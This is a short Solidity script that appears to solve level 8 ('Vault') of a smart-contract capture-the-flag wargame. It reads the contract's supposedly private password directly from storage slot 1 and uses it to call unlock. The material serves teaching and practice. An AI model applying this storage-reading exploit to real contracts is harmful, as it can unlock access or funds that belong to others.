// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./SolveLevelBase.sol";
import "../src/interfaces/IVault.sol";

contract SolveLevel8 is SolveLevelBase {
    function getInstanceCreationData()
        internal
        pure
        override
        returns (address levelAddress, uint256 value)
    {
        levelAddress = 0xF0751022c3765f9bCa97b88bF0986BFCAEbC5D9A;
        value = 0;
    }

    function solveLevel(address instanceAddress, address player)
        internal
        override
    {
        IVault instance = IVault(instanceAddress);

        bytes32 password = vm.load(instanceAddress, bytes32(uint256(1)));
        instance.unlock(password);
    }
}
